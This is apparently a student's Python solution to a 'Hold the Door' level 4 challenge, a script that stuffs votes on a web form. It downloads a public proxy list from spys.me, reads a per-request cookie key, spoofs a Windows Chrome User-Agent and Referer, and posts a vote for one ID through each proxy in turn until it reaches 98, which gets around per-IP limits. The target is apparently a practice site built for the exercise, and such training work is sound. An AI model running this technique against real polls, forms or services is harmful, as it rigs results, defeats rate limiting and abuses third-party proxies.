#!/usr/bin/python3
'''Module for Hodor level 4 challenge'''
import requests
#from bs4 import BeautifulSoup
from lxml.html import fromstring
import re
import time

ID = 2224
votes = 98
success = 'Hold the Door challenge - Level 4'
ok = 0
fail = 0
url = 'http://158.69.76.135/level4.php'
data = {'id': ID, 'holdthedoor': 'Submit'}
referer = url
headerwin = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36'
headers = {"User-Agent": headerwin, "Referer": url}

#download http proxy

s = requests.Session()

# response = s.get('https://free-proxy-list.net/')
# parser = fromstring(response.text)
# proxlist = set()
# for i in parser.xpath('//tbody/tr')[:10]:
#     if i.xpath('.//td[7][contains(text(),"yes")]'):
#         #Grabbing IP and corresponding PORT
#         proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
#         proxlist.add(proxy)
proxlist = set()

q = s.get('http://spys.me/proxy.txt')
proxma1 = q.text.split()
for j in (proxma1):
   if ":" in j:
      proxlist.add(j)

# print(proxlist1)
# print("__________________________________________")
# print(proxlist)

#from txt local
# f = open("hodor/level_4/proxlist.txt", 'r')
# proxlist=f.read().splitlines()
response = s.get(url, headers=headers)

votescurrent = 0
txt = response.text.split()
#txtid = txt.index(str(ID))
# if ((txt[txtid+3]).isdigit()):
#        votescurrent = int(txt[txtid+3])

for e, ip in enumerate(proxlist):
   try:
      response = s.get(url, headers=headers)
      if response.status_code is not 200:
         continue
      key = response.cookies['HoldTheDoor']
      data["key"] = key
      cookie = {"HoldTheDoor": key}

      response = s.post(url, headers=headers, data=data,\
                        proxies={"http": "http://" + ip}, timeout=5, cookies=cookie)
      if response.status_code is 200 and success in response.text:
          ok += 1
          votescurrent += 1
          print("{} ok   Ip:{}".format(ok, ip), end='\r', flush=True)
   except Exception as e:
      fail += 1
      print("{} Fail Ip:{}".format(fail, ip), end='\r', flush=True)

   finally:
      if ok >= votes or fail >= 300 or votescurrent == 98:
         break

print(" Ok {}, Fail {}, Votes {}".format(ok, fail, votes))
